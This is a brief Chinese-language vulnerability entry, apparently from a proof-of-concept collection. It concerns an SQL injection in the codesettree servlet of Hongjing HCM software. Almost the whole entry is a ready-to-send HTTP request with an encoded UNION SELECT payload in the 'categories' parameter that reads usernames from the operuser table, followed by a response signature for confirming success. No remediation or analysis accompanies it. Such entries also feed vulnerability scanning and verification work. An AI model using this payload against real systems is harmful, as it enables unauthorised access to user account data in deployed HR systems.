# 宏景HCMcodesettreeSQL注入漏洞

宏景HCMcodesettree ｜ SQL注入 ｜ —
- **请求**：`GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d HTTP/1.1`
- **响应特征**：-1